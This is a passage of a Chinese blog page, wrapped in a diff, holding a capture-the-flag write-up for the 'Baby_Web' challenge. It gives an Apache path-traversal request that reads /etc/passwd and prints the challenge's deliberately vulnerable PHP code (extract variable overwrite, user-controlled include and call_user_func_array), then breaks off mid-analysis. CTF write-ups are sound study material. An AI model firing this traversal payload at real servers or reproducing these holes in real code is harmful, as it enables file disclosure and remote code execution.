@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Tenicons.png">
+  <link rel="icon" href="/img/Tenicons.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ten">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目首页  通过扫描发现了一个特殊的路径 &#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd 这个路径是一个apache的漏洞，可以目录遍历，执行命令 测了一下命令执行是不可以的，可以目录遍历 poc: 1&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd   然后根据源代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Baby_Web">
+<meta property="og:url" content="http://example.com/2022/12/06/BabyWeb/index.html">
+<meta property="og:site_name" content="Ten Blog">
+<meta property="og:description" content="题目首页  通过扫描发现了一个特殊的路径 &#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd 这个路径是一个apache的漏洞，可以目录遍历，执行命令 测了一下命令执行是不可以的，可以目录遍历 poc: 1&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd   然后根据源代码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164219690.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164252785.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164309334.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164317820.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164326650.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164339317.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164345744.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164351684.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164359542.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164407656.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164414361.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164423863.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164429596.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164438293.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164443698.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164450335.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164455952.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164502176.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/Users/%E6%9E%97%E7%99%BD/Desktop/md/img/image-20221206160100569.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164530756.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164512507.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164540320.png">
+<meta property="og:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164545355.png">
+<meta property="article:published_time" content="2022-12-06T08:40:49.000Z">
+<meta property="article:modified_time" content="2022-12-06T09:06:09.000Z">
+<meta property="article:author" content="Ten">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/12/06/BabyWeb/image-20221206164219690.png">
+  
+  
+  
+  <title>Baby_Web - Ten Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"<","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TenBlog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Baby_Web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-06 16:40" pubdate>
+          2022年12月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Baby_Web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目首页</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164219690.png" srcset="/img/loading.gif" lazyload alt="image-20221206164219690"></p>
+<p>通过扫描发现了一个特殊的路径</p>
+<p>&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd</p>
+<p>这个路径是一个apache的漏洞，可以目录遍历，执行命令</p>
+<p>测了一下命令执行是不可以的，可以目录遍历</p>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/cgi-bin/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/06/BabyWeb/image-20221206164252785.png" srcset="/img/loading.gif" lazyload alt="image-20221206164252785"></p>
+<p>然后根据源代码里的提示信息，查看一下index.php.txt文件</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164309334.png" srcset="/img/loading.gif" lazyload alt="image-20221206164309334"></p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164317820.png" srcset="/img/loading.gif" lazyload alt="image-20221206164317820"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Welcome To GFCTF <span class="hljs-number">12</span>th!!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Class.php&quot;</span>;<br><span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$temp</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;<br></code></pre></td></tr></table></figure>
+
+<p>再查看Class.php.txt</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164326650.png" srcset="/img/loading.gif" lazyload alt="image-20221206164326650"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>Class Temp&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;date = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br><br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTempName</span>(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;template);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>        <span class="hljs-variable">$system</span> = [<br>            <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br><br>        <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>        <span class="hljs-variable">$_params</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_params</span>);<br><br>        <span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>            <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>            <span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>                <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>; <br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// action</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来分析代码结构</p>
+<p>开始的地方在创建了Temp类，并且调用了display方法</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164339317.png" srcset="/img/loading.gif" lazyload alt="image-20221206164339317"></p>
+<p>创建类以后，第一步会将post请求传入的参数赋值到$data里面，然后和$this-&gt;data合并成一个数组</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164345744.png" srcset="/img/loading.gif" lazyload alt="image-20221206164345744"></p>
+<p>合并到一个数组以后，调用display方法，这里也就是变量覆盖的位置了</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164351684.png" srcset="/img/loading.gif" lazyload alt="image-20221206164351684"></p>
+<p>接着步入进去getTempName方法</p>
+<p>dir等于admin的话，会将$template进行一个检测，不能有..出现，否则替换成空，并赋值给$this-&gt;template</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>    